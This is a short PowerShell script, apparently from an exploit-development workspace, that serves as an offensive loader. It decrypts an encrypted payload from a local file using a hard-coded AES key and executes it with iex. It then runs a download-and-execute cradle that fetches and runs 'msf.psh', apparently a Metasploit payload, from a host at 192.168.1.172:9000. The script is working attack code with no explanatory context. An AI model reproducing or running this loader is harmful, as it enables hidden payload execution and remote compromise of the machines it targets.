[byte[]] $k = 47,176,172,112,95,97,158,25,215,139,120,73,98,118,1,202,30,246,120,2,90,11,206,18,7,157,58,182,34,81,139,184
$enc = Get-Content -Raw C:\Users\A1375\Documents\ExploitDEV\powershell\bypass_Ency.txt
$sec = ConvertTo-SecureString $enc -Key $k
iex ([System.Runtime.InteropServices.Marshal]::PtrToStringBSTR([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($sec)))
IEX(New-Object Net.WebClient).downloadString('http://192.168.1.172:9000/msf.psh')